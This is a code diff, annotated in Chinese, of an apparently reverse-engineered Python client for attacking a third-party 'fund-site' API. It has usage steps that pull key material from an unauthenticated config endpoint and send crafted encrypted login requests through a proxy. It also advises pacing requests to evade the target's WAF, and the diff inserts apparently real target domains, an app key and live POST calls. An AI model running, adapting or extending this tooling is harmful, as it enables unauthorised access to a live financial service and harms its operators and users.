@@ -26,8 +26,8 @@
 
 ```
 1) 先取密钥素材（无需鉴权）：`curl -s -x http://127.0.0.1:7892 "https://<host>/member/bb/api/getBaboConfig"` → appId / ipayCustomerUrl / appKey / dhVideoList / isIpayMergeChannel
-2) 填进 tgt2905_api.py 的 BABO 常量
-3) `python tgt2905_api.py "/member/memberManager/loginV3" "{\"userAccount\":\"x\"}"` → 打印 session_key、请求体结构与服务端响应（含 WAF 判定 `_waf`）
+2) 填进 ky588_api.py 的 BABO 常量
+3) `python ky588_api.py "/member/memberManager/loginV3" "{\"userAccount\":\"x\"}"` → 打印 session_key、请求体结构与服务端响应（含 WAF 判定 `_waf`）
 注意：`enc_post()` 会构造合法加密体；若返回 `{AA,data}` 说明服务端走 STATICAES 信封，本端无密钥。目标前置阿里云 WAF，POST 高频会被永久 405 阻断，务必 ≥3s 间隔并即时停手。
 ```
 
@@ -36,7 +36,7 @@
 ```
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-"""tgt2905 fund-site TIMESTAMP/STATICAES channel client.
+"""ky588 fund-site TIMESTAMP/STATICAES channel client.
 
 Reverse-engineered from /static/js/main.80e1a14b.js (webpack module 191):
   h = MD5(e).hex                       (password field)
@@ -67,14 +67,14 @@ HOST = "https://example.com"
 PROXY = {"http": "http://127.0.0.1:7892", "https": "http://127.0.0.1:7892"}
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
       "Chrome/203.0.113.36 Safari/537.36")
-DEVICE_ID = "target26.example.com"
+DEVICE_ID = "ky588-1.cc"
 
 # getBaboConfig constants (unauthenticated /member/bb/api/getBaboConfig)
 BABO = {
     "appId": "bf709056-6806-4252-98e6-3f9ca2022cf0",
-    "ipayCustomerUrl": "https://target27.example.com",
+    "ipayCustomerUrl": "https://j2SRjZO.1iPJgT.xyz",
     "appKey": "KgBPAHYAUQB5AGUAbAArAEEANQAvAG0ARgA/AHoAWQBCAFUAXAAlAD4AMQAuAEoA",
-    "dhVideoList": "https://target28.example.com/CYnj/Hb7Ya",
+    "dhVideoList": "https://api.mk3lsv.com/CYnj/Hb7Ya",
     "isIpayMergeChannel": 300,
 }
 
@@ -146,7 +146,7 @@ def call(ep, payload=None, channel="TIMESTAMP", verbose=True, extra_headers=None
     if extra_headers:
         hdr.update(extra_headers)
     body = json.dumps(payload if payload is not None else {})
-    r = target8.example.com(HOST + ep, data=body.encode(), headers=hdr, timeout=20)
+    r = s.post(HOST + ep, data=body.encode(), headers=hdr, timeout=20)
     txt = r.text
     if "has been blocked" in txt:
         return {"_waf": True, "_http": r.status_code, "_raw": txt[:200]}
@@ -197,7 +197,7 @@ def enc_post(ep, payload, offset=0, verbose=True, extra_headers=None):
            "Content-Type": "application/json", "Isauthent": ts, "isstep": ts}
     if extra_headers:
         hdr.update(extra_headers)
-    r = target8.example.com(HOST + ep, data=body.encode(), headers=hdr, timeout=20)
+    r = s.post(HOST + ep, data=body.encode(), headers=hdr, timeout=20)
     txt = r.text
     res = {"_http": r.status_code, "_key": key, "_plain": plain}
     if "has been blocked" in txt:
